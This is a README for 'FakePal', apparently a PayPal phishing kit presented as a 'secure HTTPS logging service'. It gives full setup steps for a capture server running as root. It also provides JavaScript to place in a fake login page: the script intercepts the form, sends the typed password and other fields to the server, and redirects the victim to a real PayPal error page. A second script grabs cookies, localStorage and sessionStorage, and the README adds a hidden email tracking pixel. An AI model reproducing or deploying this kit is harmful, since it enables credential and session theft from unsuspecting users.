
# FakePal Logging Service

This repository contains a Python script and associated files for running a secure HTTPS logging server. The server logs visitor information, form data, and email open tracking events.

## Setup Instructions

### Prerequisites
- Ubuntu server
- Python 3.x
- SSL certificates from Let's Encrypt or another provider
- IPinfo token for location data

### Directory Structure
```
/root/fakepal/
│
├── index.html                # Your main HTML file
├── Tools/
│   └── capture-server.py     # The main server script
├── log/                      # Directory for log files
│   ├── log.txt
│   └── email_open_log.txt
└── certs/                    # Directory for SSL certificates
    ├── fullchain.pem
    └── privkey.pem
```

### 1. Clone the Repository
```sh
git clone <repository_url> /root/fakepal
cd /root/fakepal
```

### 2. Install Dependencies
Ensure you have Python 3 and `requests` library installed:
```sh
sudo apt update
sudo apt install python3 python3-pip
pip3 install requests
```

### 3. Configure SSL Certificates
Place your SSL certificates in `/root/fakepal/certs/` directory. Update paths in `capture-server.py` if necessary.

### 4. Add IPinfo Token
Edit `capture-server.py` and add your IPinfo token:
```python
IPINFO_TOKEN = 'your_ipinfo_token'
```

### 5. Setup Systemd Service
Create a systemd service file `/etc/systemd/system/fakepal.service` with the following content:
```ini
[Unit]
Description=Web Server for Logging Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 /root/fakepal/Tools/capture-server.py
WorkingDirectory=/root/fakepal    
StandardOutput=file:/var/log/fakepal.log
StandardError=file:/var/log/fakepal_err.log
User=root
Restart=always

[Install]
WantedBy=multi-user.target
```

### 6. Reload Systemd and Start Service
```sh
sudo systemctl daemon-reload
sudo systemctl enable fakepal.service
sudo systemctl start fakepal.service
```

### 7. Verify the Service
Check the status of the service:
```sh
sudo systemctl status fakepal.service
```

### 8. Setup Log Cleanup Cron Job
Add a cron job to compress daily logs and delete logs older than a week. Create a script `/root/fakepal/Tools/cleanup_logs.sh`:
```sh
#!/bin/bash
LOG_DIR="/root/fakepal/log"
find $LOG_DIR -type f -name "*.log" -mtime +7 -exec rm {} \;
tar -czf $LOG_DIR/logs_$(date +\%F).tar.gz $LOG_DIR/*.log --remove-files
```
Make the script executable:
```sh
chmod +x /root/fakepal/Tools/cleanup_logs.sh
```
Add the cron job:
```sh
(crontab -l 2>/dev/null; echo "0 0 * * * /root/fakepal/Tools/cleanup_logs.sh") | crontab -
```

## Client-side Tracking
Include the following scripts in your `index.html` to log form data and client-side data:
```html
<script>
    document.addEventListener('DOMContentLoaded', function() {
        var form = document.getElementById('loginForm');
        form.addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the default form submission

            var formData = new FormData(form);
            var data = {};
            formData.forEach((value, key) => data[key] = value);

            // Manually add the password field value
            var passwordField = document.getElementById('password');
            data['login_password'] = passwordField.value;

            // Use the fetch API to write the data to a log file
            fetch('/log', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                console.log('Form data logged:', response);
                // Redirect to the specified URL after 150ms
                setTimeout(() => {
                    window.location.href = 'https://www.paypal.com/webapps/mpp/page-not-found';
                }, 150);
            })
            .catch(error => {
                console.error('Error logging form data:', error);
                // Redirect to the specified URL in case of error
                setTimeout(() => {
                    window.location.href = 'https://www.paypal.com/webapps/mpp/page-not-found';
                }, 150);
            });
        });
    });
</script>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        var c = document.cookie;
        var h = window.history;
        var ls = localStorage;
        var ss = sessionStorage;
        var p = navigator.plugins;
        var ua = navigator.userAgent;

        fetch('/log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                cookies: c,
                history: h.length,  // Use h.length to avoid circular structure error
                localStorageData: JSON.stringify(ls),
                sessionStorageData: JSON.stringify(ss),
                plugins: Array.from(p).map(plugin => plugin.name),
                userAgent: ua
            })
        })
        .then(response => {
            console.log('Page data logged:', response);
        })
        .catch(error => {
            console.error('Error logging page data:', error);
        });
    });
</script>
```

## Tracking Email Opens
To track email opens, embed the following image tag in your email HTML:
```html
<img src="https://yourdomain.com/track-open?email=example@example.com" alt="tracker" style="display:none;">
```
This will log the email opens to `email_open_log.txt`.

## Contributing
Feel free to fork this repository and submit pull requests.

## License
This project is licensed under the MIT License.
